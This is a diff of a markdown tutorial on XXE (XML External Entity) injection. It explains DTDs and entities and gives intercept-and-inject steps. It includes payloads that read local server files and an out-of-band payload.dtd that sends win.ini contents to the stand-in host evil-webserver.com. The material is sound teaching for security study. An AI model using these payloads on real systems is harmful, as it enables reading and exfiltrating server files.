@@ -1,4 +1,6 @@
-# Vulnerability: XXE 
+# Vulnerability: XXE
+
+### Description 
 
 XXE = XML External Entity
 
@@ -19,11 +21,11 @@ Now we could use `&myentity;` and it would be replaced with `"my entity value"`.
 ### What is a DTD
 
 A DTD is a Document Type Definition.
-A DTD defines the structure anf the legal elements and attributes of an XML document. A DTD can be `Internal` or `External`, or a hybrid of the two.
+A DTD defines the structure and the legal elements and attributes of an XML document. A DTD can be `Internal` or `External`, or a hybrid of the two.
 
 ### Why use a DTD
 
-With a DTD, independent groups of peopl can agree on a standard DTD for interchanging data.
+With a DTD, independent groups of people can agree on a standard DTD for interchanging data.
 An application can use a DTD to verify that XML data is valid. 
 
 ### Internal DTD Declaration
@@ -45,6 +47,7 @@ If the DTD is declared inside the XML file, it must be wrapped inside the `<!DOC
 <body>Text here</body>
 </note>
 ```
+
 ### An External DTD Declaration
 If the DTD is declared in an external file, the `<!DOCTYPE>`definition must contain a reference to the DTD file.
 
@@ -63,15 +66,17 @@ The declaration of an external entity uses the `SYSTEM` keyword and must specify
 	<body>Text here</body>
 </note>
 ```
+
 Here is what the `dtd` file looks like
 ```xml
 <!ELEMENT note (to,from,heading,body)>
 <!ELEMENT to (#PCDATA)>
 <!ELEMENT from (#PCDATA)>
 <!ELEMENT heading (#PCDATA)>
-<!ELEMENT body (#PCDATA)> 
+<!ELEMENT body (#PCDATA)>
 ```
-`ENTITY` tags within are simply shortcut to a special character that can be reference by calling the XML file. Notice that the last `ENTITY` tag is actually pulling the contens of a local file via the `SYSTEM` word.
+
+`ENTITY` tags within are simply shortcut to a special character that can be reference by calling the XML file. Notice that the last `ENTITY` tag is actually pulling the contents of a local file via the `SYSTEM` word.
 
 ```xml
 <!DOCTYPE STRUCTURE [
@@ -80,15 +85,19 @@ Here is what the `dtd` file looks like
 <!ENTITY file SYSTEM “file:///c:/server_files/application.conf” >
 ]>
 ```
+
 The above `.dtd` file might be used as follows
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPES foo SYSTEM "http://validserver.com"/formatting.dtd">
 <specifications>&file;</specifications>
 ```
+
 `formatting.dtd` is called using `DOCTYPE` tags and the XML file can reference the `ENTITYs` and structure within.
 
 `ENTITYs` can be used without formality of full `.dtd` file. By calling `DOCTYPE` and using square brackets`[]`, you can reference `ENTITY` tags for use in only that XML file. Below the `application.conf` file is referenced for use in `<configuration></configuration>` tags, without a full `.dtd` file to host it:
+
 ```xml
 <?xml version=”1.0″ encoding=”ISO-8859-1″?>
 <!DOCTYPE example [
@@ -97,20 +106,23 @@ The above `.dtd` file might be used as follows
 ]>
 <configuration>&file;</configuration>
 ```
-### Sumary
+
+### Summary
+
 - DTD files can be external or internal to an XML file
 - ENTITYs exist within DTD files
 - ENTITYs can call local system files
 
-# Injection
+## Injection
 
-When data is passed in a `HTTP` request it opens the possibility of abuse from the user. In the case of a form wrappen in XML being sent to the server to be processed:
+When data is passed in a `HTTP` request it opens the possibility of abuse from the user. In the case of a form wrapped in XML being sent to the server to be processed:
+
 - Intercept vulnerable request with a web proxy
 - Add injected ENTITY tag and `&xxe;` variable reference
 	- ensure the `&xxe;` reference is with data that will be returned and displayed
 - Release the intercept POST request
 
-# Out of band
+### Out of band
 
 While some attacks might be as easy as that there are times where it is not as easy and here we turn to those external .dtd files mentioned. DOCTYPES references to external .dtd files allow us to conduct this attack entirely `out-of-band`
 
@@ -143,13 +155,16 @@ Host: myserver.com
 </note>
 
 ```
+
 And here is what that `payload.dtd` contains
+
 ```xml
 <?xml version=”1.0″ encoding=”utf-8″ ?>
 <!ENTITY % data SYSTEM “file:///c:/windows/win.ini”>
 <!ENTITY % bravo “<!ENTITY % charlie SYSTEM
 ‘https://evil-webserver.com/?%data;’>”>
 ```
+
 - Client sends the POST request with the injected XML code
 	- The server, via the XML parser, parses the XML from top to bottom, reaching the injected ENTITY
 - The server requests `payload.dtd` from `https://evil-webserver.com`
@@ -158,23 +173,7 @@ And here is what that `payload.dtd` contains
 
 The extracted data can be viewed by the attacker in their web server logs.
 
-# Blind XXE
-
-In many cases XXE will be blind, meaning the application will not return the values of any defined external entities in its response. Bling XXE vulns can still be detected and exploited, but more advanced techniques are required. 
-
-	- Trigger out-of-band network interactions, sometimes exfiltrating sensitive data within the interaction data
-	- Trigger XML parsing errors in such a way that the error messages contain sensitive data
-
-### Out of band techniques
-
-Def. an external entitity: 
-
-` <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]> `
-
-
-
-
-## Learn more 
+## Learn more
 
 [XXE Payloads](https://gist.github.com/staaldraad/01415b990939494879b4)
 
@@ -187,3 +186,5 @@ Def. an external entitity:
 [PortSwigger](https://portswigger.net/web-security/xxe)
 
 [Cracking the lens: targeting HTTP's hidden attack-surface](https://portswigger.net/blog/cracking-the-lens-targeting-https-hidden-attack-surface)
+
+[Burp University](https://www.youtube.com/watch?v=9ZokuRHo-eY)
